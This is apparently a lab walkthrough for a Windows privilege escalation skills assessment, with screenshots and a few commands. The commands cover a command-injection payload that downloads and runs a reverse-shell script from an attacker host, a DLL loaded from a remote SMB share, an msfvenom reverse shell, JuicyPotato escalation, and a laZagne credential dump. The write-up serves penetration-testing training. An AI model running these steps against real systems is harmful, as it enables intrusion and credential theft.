### Which two KBs are installed on the target system? (Answer format: 3210000&3210060)

Output scan
![](Screenshot%202026-08-26%20at%2009.59.02.png)

Vulnerable on port 80
![](Screenshot%202026-08-26%20at%2010.06.16.png)

Prepare payload
![](Screenshot%202026-08-26%20at%2010.08.20.png)

Transfer file and receive shell
```Command Injection
127.0.0.1 | powershell -ExecutionPolicy Bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.235:1234/rshell.ps1')
```
![](Screenshot%202026-08-26%20at%2010.10.02.png)![](Screenshot%202026-08-26%20at%2010.10.10.png)
![](Screenshot%202026-08-26%20at%2010.12.34.png)

Generate meterpreter session
![](Screenshot%202026-08-26%20at%2010.14.58.png)
![](Screenshot%202026-08-26%20at%2010.17.24.png)

```powershell
powershell -ep bypass rundll32.exe \\10.10.14.235\TNYI\test.dll,0
```
![](Screenshot%202026-08-26%20at%2010.18.32.png)
![](Screenshot%202026-08-26%20at%2010.19.49.png)

```shell
shell
systeminfo
```
![](Screenshot%202026-08-26%20at%2010.55.16.png)
### Find the password for the ldapadmin account somewhere on the system.

Checking user's groups and privilege
![](Screenshot%202026-08-26%20at%2010.25.08.png)
![](Screenshot%202026-08-26%20at%2010.55.16.png)

Use `multi/recon/local_exploit_suggester`
![](Screenshot%202026-08-26%20at%2010.28.43.png)

Prepare payload
```shell
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.235 LPORT=6666 \
  -f exe -o shell.exe
  
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

```shell
upload /opt/JuicyPotato.exe C:\\Windows\\Temp\\jp.exe
upload shell.exe C:\\Windows\\Temp\\shell.exe
```
![](Screenshot%202026-08-26%20at%2011.07.26.png)

Run `multi/handler` and execute Juicy Potato
![](Screenshot%202026-08-26%20at%2011.12.37.png)
![](Screenshot%202026-08-26%20at%2011.15.37.png)

Upload laZagne.exe
![](Screenshot%202026-08-26%20at%2011.19.48.png)
```shell
execute -f C:\\Windows\\Temp\\lz.exe -a "all" -i
```
![](Screenshot%202026-08-26%20at%2011.21.32.png)
### Escalate privileges and submit the contents of the flag.txt file on the Administrator Desktop.

![](Screenshot%202026-08-26%20at%2011.23.02.png)
### After escalating privileges, locate a file named confidential.txt. Submit the contents of this file.

```cmd
where /R C:\ confidential.txt
```
![](Windows%20Privilege%20Escalation%20Skills%20Assessment%20-%20Part%20I-20260826-112321.png)
![](Screenshot%202026-08-26%20at%2011.24.42.png)